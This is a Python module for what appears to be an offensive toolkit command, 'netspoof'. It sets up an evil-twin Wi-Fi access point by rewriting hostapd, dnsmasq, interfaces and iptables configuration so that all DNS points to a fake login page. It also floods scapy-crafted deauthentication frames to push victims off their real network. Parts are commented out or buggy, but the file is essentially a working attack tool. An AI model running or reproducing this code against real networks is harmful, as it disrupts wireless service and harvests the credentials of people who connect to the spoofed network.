from login_server import login_server
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


class netspoof():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-i", "-s", "-c"]
        # self.deauth = True
        # self.instance = login_server()

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will deauthorize a specifc network than spoof a user "
            "into reconecting with a spoofed network."
            "If you wish to exit the spoof "
            "use the control + c\n"
            "\nUsage:\n"
            "############\n"
            "\n'netspoof -s <ssid> -i <interface> -c <channel>'\n"
        )
        return hlp

    def netspoof(self, var):
        self.start_server()
        if "-s" in var and "-i" in var and "-c" in var:
            try:
                # self.deauthnet(var["-i"],var["-b"])
                # self.createAP(var["-s"], var["-i"], var["-c"])
                self.start_server()
            except Exception:
                return "Cannot spoof the network " + "'" + var["-s"] + "'"
        else:
            return "Error: Need to specifiy network to spoof"

    def createAP(self, ssid, iface, channel):

        # editing config file for ap settings
        ap_confile = open("/etc/hostapd/hostapd.conf", "w")
        config = (
            "interface=" + iface + "\n"
            "ssid=" + ssid + "\n"
            "driver=rtl8187\n"
            "channel=" + channel + "\n"
        )
        ap_confile.write(config)
        ap_confile.close()

        # editing udhcp.conf file
        dhcp_confile = open("/etc/dnsmasq.conf", "w")
        config = (
            "log-facility=/var/log/dnsmasq.log\n"
            "address=/#/10.0.0.1\n"
            "interface=wlan0\n"
            "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
            "no-resolv\n"
            "log-queries\n"
        )
        dhcp_confile.write(config)
        dhcp_confile.close()

        # editing interfaces file
        # all dns queries are routed to 10.0.0.1
        # where the fake login page is located
        inter_default = open("/etc/network/interfaces", "w")
        config = (
            "auto lo\n"
            "\niface lo inet loopback\n"
            "\niface eth0 inet dhcp\n"
            "iface " + iface + " inet static\n"
            "address 10.0.0.1\n"
            "netmask 255.255.255.0\n"
            "broadcast 255.0.0.0\n"
            "pre-up iptables-restore < /etc/iptables.rules\n"
        )

        inter_default.write(config)
        inter_default.close()

        # editing default hostapd file
        hostapd_default = open("/etc/default/hostapd", "w")
        config = (
            "# Defaults for hostapd initscript\n"
            "#\n"
            "# See /usr/share/doc/hostapd/README.Debian for information"
            " about alternative\n"
            "# methods of managing hostapd.\n"
            "#\n"
            "# Uncomment and set DAEMON_CONF to the absolute path of"
            " a hostapd configuration\n"
            "# file and hostapd will be started during system boot."
            " An example configuration\n"
            "# file can be found at "
            "/usr/share/doc/hostapd/examples/hostapd.conf.gz\n"
            "#\n"
            "DAEMON_CONF='/etc/hostapd/hostapd.conf'\n"

            "# Additional daemon options to be appended to hostapd command:-\n"
            "#       -d   show more debug messages (-dd for even more)\n"
            "#       -K   include key data in debug messages\n"
            "#       -t   include timestamps in some debug messages\n"
            "#\n"
            "# Note that -B (daemon mode) and -P (pidfile) "
            "options are automatically\n"
            "# configured by the init.d script and must not "
            "be added to DAEMON_OPTS.\n"
            "#\n"
            "#DAEMON_OPTS=""\n"
        )

        hostapd_default.write(config)
        hostapd_default.close()

        # set ip table rules
        os.system("iptables -F")
        os.system(
            "iptables -i wlan0 -A INPUT -m conntrack --ctstate"
            " ESTABLISHED,RELATED -j ACCEPT"
        )
        os.system("iptables -i wlan0 -A INPUT -p tcp --dport 80 -j ACCEPT")
        os.system("iptables -i wlan0 -A INPUT -p udp --dport 53 -j ACCEPT")
        os.system("iptables -i wlan0 -A INPUT -p udp --dport 67:68 -j ACCEPT")
        os.system("iptables -i wlan0 -A INPUT -j DROP")

        os.system("sudo sh -c 'iptables-save > /etc/iptables.rules'")

        # put interface in access mode
        os.system("sudo ifconfig " + iface + " down")
        os.system("iwconfig " + iface + " mode master")
        os.system("sudo ifconfig " + iface + " up")

        # start start AP and dhcp
        os.system("/etc/init.d/hostapd start")
        os.system("/etc/init.d/dnsmasq restart")
        os.system("service nginx start")
        print("Started Evil Twin AP..")

    def deauthnet(self, iface, bssid):

        # make sure device is in monitor mode
        os.system("sudo ifconfig " + iface + " down")
        os.system("iwconfig " + iface + " mode monitor")
        os.system("sudo ifconfig " + iface + " up")

        # creating deauth packet to send
        packet = (
            RadioTap() /
            Dot11(
                type=0, addr1="ff:ff:ff:ff:ff:ff",
                addr2="A8:D3:F7:0F:9B:34",
                addr3=bssid) / Dot11Deauth()
        )
        while self.deauth:
            for n in range(0, 64):
                sendp(packet, iface=iface)
                sendp(packet, iface=iface)

    def stopAP(self):
        os.system("service hostapd stop")
        os.system("service udhcpd stop")

    def start_server(self):
        instance = login_server()

    def checklibs():
        return
        # checks if udhcpd and hostapd are both installed
